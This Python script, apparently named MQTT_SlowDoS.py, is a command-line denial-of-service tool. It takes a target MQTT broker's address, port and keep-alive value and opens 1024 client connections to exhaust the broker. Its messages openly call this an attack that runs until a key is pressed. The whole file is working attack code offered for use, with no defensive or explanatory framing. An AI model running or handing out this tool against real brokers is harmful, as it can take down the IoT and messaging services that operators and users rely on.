#!/usr/bin/python3

import paho.mqtt.client as mqtt
import time
from tqdm import tqdm
import subprocess
import sys



def parsing_parameters():
	l = len(sys.argv)
	port = 1883
	keepAlive = 60

    #Script with no parameters
	if(l == 1):
		print('''\n	Usage:

	python3 MQTT_SlowDoS.py -a <Broker_Address> -p <Broker_Port> -k <Keep_Alive>

	-a
		IP address of MQTT broker

	-p
		port of MQTT broker (default 1883)

	-k
		keep alive parameter of MQTT protocol (default 60 sec)

            ''')
		exit()


	for i in range(1,l):
		if(sys.argv[i] == '-p' and i<l):
			port = sys.argv[i+1] #MQTT broker port
		elif(sys.argv[i] == '-k' and i<l):
			if(int(sys.argv[i+1]) > 65535 or int(sys.argv[i+1]) <= 0):
				keepAlive = 60
			else:
				keepAlive = sys.argv[i+1] #KeepAlive parameter of MQTT
		elif(sys.argv[i] == '-a' and i<l):
			broker_address = sys.argv[i+1] #IP broker address
		elif((sys.argv[i] == '--help' or sys.argv[i] == '-h') and i<=l):
			print('''\nUsage:

	python3 MQTT_SlowDoS.py -a <Broker_Address> -p <Broker_Port> -k <Keep_Alive>

	-a
		IP address of MQTT broker

	-p
		port of MQTT broker (default 1883)

	-k
		keep alive parameter of MQTT protocol (default 60 sec)

            ''')
			exit()

	return broker_address, int(port), int(keepAlive)
#---------------------------------------------------------------------------------------




try:
	_broker_address, _port, _keepAlive = parsing_parameters() #taking parameters from command line

	vett = [] #creating array for clients

	#loop where the program creates multiple mqtt connections to the broker
	print('\nRequesting connections...\n')

	for i in tqdm(range(1024)):
		client = mqtt.Client(f'client{i}') #creating new client
		vett.append(client) #inserting client in array
		vett[i-1].connect(_broker_address, _port, _keepAlive) #client requests connection to broker

	print('\nRequests sent !\n')

	end = input('[ Press any key to stop the attack ]\n')
	print('[ Attack terminated ]\n')

except KeyboardInterrupt:
	subprocess.call('clear', shell=True)
	print('ERROR: unexpected attack stop')
